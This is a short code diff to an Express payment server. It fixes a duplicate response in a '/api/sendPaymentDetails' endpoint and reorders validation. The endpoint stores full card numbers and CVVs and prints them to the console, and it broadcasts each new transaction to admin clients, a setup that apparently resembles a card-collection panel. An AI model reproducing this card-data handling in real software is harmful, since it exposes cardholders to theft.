@@ -89,12 +89,16 @@ app.get('/api/transactions', (req, res) => {
 });
 
 // Process Payment
+// server.js - Fix the duplicate response in sendPaymentDetails
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-   if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
+  
+  // Add validation
+  if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
     return res.status(400).json({ status: "error", message: "Missing required fields" });
   }
+
+  const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase(); // Increased to 8 bytes for better uniqueness
   
   const transaction = {
     id: invoiceId,
@@ -117,10 +121,11 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   
   transactions.set(invoiceId, transaction);
   console.log("New transaction recorded:", transaction);
-  res.json({ status: "success", invoiceId });
- // Add this line to notify all admin clients
+  
+  // Emit socket event before sending response
   io.emit('new_transaction', invoiceId);
   
+  // Send single response
   res.json({ status: "success", invoiceId });
 });
 
